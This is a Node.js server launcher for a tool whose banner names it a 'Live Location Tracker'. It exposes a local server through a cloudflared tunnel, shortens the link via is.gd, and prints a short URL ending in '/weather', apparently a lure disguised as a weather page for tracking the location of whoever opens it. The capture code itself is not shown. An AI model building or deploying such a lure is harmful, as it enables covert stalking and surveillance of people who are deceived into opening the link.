const { exec } = require("child_process")
const cookieParser = require("cookie-parser")
const socketIO = require("socket.io")
const config = require("./config")
const express = require("express")
const tarkine = require("tarkine")
const http = require('http')

const app = express()
const server = http.createServer(app)
const io = new socketIO.Server(server)
const PORT = process.env.PORT || config.port
global.remoteURL

global.IO = io

app.set("view engine", "html")
app.engine("html", tarkine.renderFile)
app.use(cookieParser())
app.use(express.urlencoded({ extended: false }))
app.use(express.static(__dirname + "/public"))
app.use(express.json())

app.use("/", require("./router"))

// Tunnel handle karne aur short link banane ka function
function startTunnel(port) {
    return new Promise((resolve) => {
        const process = exec(`cloudflared tunnel --url http://localhost:${port}`);
        
        process.stderr.on('data', async (data) => {
            const match = data.match(/https:\/\/[a-z0-9-]+\.trycloudflare\.com/);
            if (match) {
                const originalUrl = match[0];
                console.log(`\n[+] Cloudflare Link: ${originalUrl}`);
                console.log(`[+] Shortening link via is.gd...`);
                
                try {
                    // Node.js ke inbuilt fetch se is.gd api call kar rahe hain (No external package needed)
                    const response = await fetch(`https://is.gd/create.php?format=json&url=${encodeURIComponent(originalUrl)}`);
                    const json = await response.json();
                    if (json.shorturl) {
                        resolve(json.shorturl);
                    } else {
                        resolve(originalUrl); // Fallback agar shortener fail ho jaye
                    }
                } catch (err) {
                    resolve(originalUrl);
                }
            }
        });
    });
}

server.listen(PORT, async () => {
    console.log(`\n========================================`)
    console.log(`   CREATED BY : Shabaz Pathan           `)
    console.log(`   TOOL       : Live Location Tracker   `)
    console.log(`========================================\n`)

    const localURL = `http://localhost:${PORT}`
    
    console.log(`LOCAL  : ${localURL}`)
    console.log("Starting cloudflared tunnel...")
    
    remoteURL = await startTunnel(PORT)

    console.log(`\n========================================`)
    console.log(`🔥 LIVE SHORT URL : ${remoteURL}/weather`)
    console.log(`========================================\n`)
})

